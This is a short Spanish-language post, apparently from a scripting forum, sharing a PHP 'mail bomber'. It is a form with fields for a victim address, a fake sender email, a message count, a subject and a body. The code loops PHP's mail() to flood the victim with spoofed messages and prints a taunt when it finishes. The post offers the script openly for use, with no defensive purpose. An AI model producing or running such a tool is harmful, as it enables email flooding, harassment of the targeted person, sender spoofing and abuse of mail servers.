@@ -1,0 +1,46 @@
+Hola,este es mi primer script en php
+cogi la fuente de otro script de esta web y no funcionava,asi que lo arregle y ademas puse para que puedes enviar la cantidad que desees
+[codigo]&lt;?
+if($enviar) {
+$victima = $_POST['victima'];
+$nombre = $_POST['nombre'];
+$asunto = $_POST['asunto'];
+$mensaje = $_POST['mensaje'];
+$email = $_POST['email'];
+$mails = $_POST['mails'];
+$a=0;
+while($a&lt;$mails) {
+mail($victima,$asunto,$mensaje,&quot;From: $nombre &lt;$email&gt;\n&quot;);
+$a++;
+}
+echo &quot;Acabas de joder al pobre $victima&quot;;
+}
+?&gt; &lt;form name=&quot;form1&quot; method=&quot;post&quot; action=&quot;&lt;? echo $PHP_SELF; ?&gt;&quot;&gt;
+&lt;div align=&quot;center&quot;&gt;Contacto General&lt;/div&gt;
+&lt;div align=&quot;center&quot;&gt;
+    Nombre:&lt;br&gt;
+    &lt;input name=&quot;nombre&quot; type=&quot;text&quot; class=inbox id=&quot;nombre&quot;&gt;
+    &lt;br&gt;
+Email Falso:&lt;br&gt;
+&lt;input type=&quot;text&quot; name=&quot;email&quot; class=inbox&gt;
+&lt;br&gt;
+Victima:&lt;br&gt;
+&lt;input type=&quot;text&quot; name=&quot;victima&quot; class=inbox&gt;
+&lt;br&gt;
+Mails:&lt;br&gt;
+&lt;input name=&quot;mails&quot; type=&quot;text&quot; class=inbox id=&quot;mails&quot;&gt;
+&lt;br&gt;
+Asunto:&lt;br&gt;
+&lt;input name=&quot;asunto&quot; type=&quot;text&quot; class=inbox id=&quot;asunto&quot;&gt;
+&lt;br&gt;
+Mensaje:&lt;br&gt;
+&lt;textarea name=&quot;mensaje&quot; cols=&quot;30&quot; rows=&quot;5&quot; class=inbox&gt;&lt;/textarea&gt;
+&lt;br&gt;
+&lt;br&gt;
+&lt;input type=&quot;submit&quot; name=&quot;enviar&quot; value=&quot;Enviar&quot; class=boton&gt;
+  &lt;/div&gt;&lt;/form&gt;[/codigo]
+
+Cualkier dudad postear en comentarios
+
+Direccion de Script original:
+http://www.electros.net/?scripts&amp;c=12&amp;s=52
